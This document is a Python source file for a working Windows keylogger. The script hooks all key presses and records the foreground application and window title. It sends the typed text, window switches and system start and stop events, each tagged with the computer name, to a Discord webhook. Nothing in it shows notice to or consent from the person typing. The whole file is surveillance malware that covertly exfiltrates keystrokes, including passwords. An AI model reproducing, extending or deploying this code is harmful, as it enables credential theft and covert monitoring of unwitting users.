import os
import psutil
import requests
import time
import socket
import win32gui
import win32process
import keyboard
import threading
import atexit
from datetime import datetime

# Securely store the webhook URL (use environment variable)
WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
if not WEBHOOK_URL:
    raise ValueError("Discord webhook URL is not set.")

PC_NAME = socket.gethostname()
keystrokes = ""
keystroke_lock = threading.Lock()
keystroke_app = "Unknown"
keystroke_window = "Unknown"
last_logged = None

def send_to_discord(message):
    """Send logs to Discord with proper formatting."""
    payload = {"content": f"```{message}```"}
    try:
        requests.post(WEBHOOK_URL, json=payload).raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

def log_system_event(event):
    """Log system startup and shutdown events."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_to_discord(f"[{timestamp}] {PC_NAME} - {event}")

def get_active_window_title():
    """Retrieve the active window's process name and title."""
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd:
        return None, None
    
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    try:
        proc = psutil.Process(pid)
        return proc.name(), win32gui.GetWindowText(hwnd)
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return None, None

def send_keystrokes():
    """Send keystrokes to Discord when Enter is pressed."""
    global keystrokes, keystroke_app, keystroke_window
    with keystroke_lock:
        if keystrokes.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME} ({keystroke_app} - {keystroke_window}): {keystrokes}")
            keystrokes = ""
            keystroke_app, keystroke_window = "Unknown", "Unknown"

def log_keystroke(event):
    """Capture and buffer keystrokes efficiently."""
    global keystrokes, keystroke_app, keystroke_window
    key = event.name
    with keystroke_lock:
        if not keystrokes:
            keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
        
        if len(key) == 1 and key.isprintable():
            keystrokes += key
        elif key == "space":
            keystrokes += " "
        elif key == "enter":
            send_keystrokes()
        elif key == "backspace" and keystrokes:
            keystrokes = keystrokes[:-1]

keyboard.on_press(log_keystroke)

def monitor_window_switch():
    """Monitor application switches and log them efficiently."""
    global last_logged
    while True:
        new_app_name, new_window_title = get_active_window_title()
        if new_app_name and new_window_title and (new_app_name, new_window_title) != last_logged:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_to_discord(f"[WINDOW SWITCH] [{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})")
            last_logged = (new_app_name, new_window_title)
        time.sleep(1)

def start_threads():
    """Start background threads for logging keystrokes and monitoring window switches."""
    threading.Thread(target=monitor_window_switch, daemon=True).start()
    keyboard.wait()

if __name__ == "__main__":
    log_system_event("System started, Connection Established")
    atexit.register(lambda: log_system_event("System shutting down, Connection Lost"))
    start_threads()
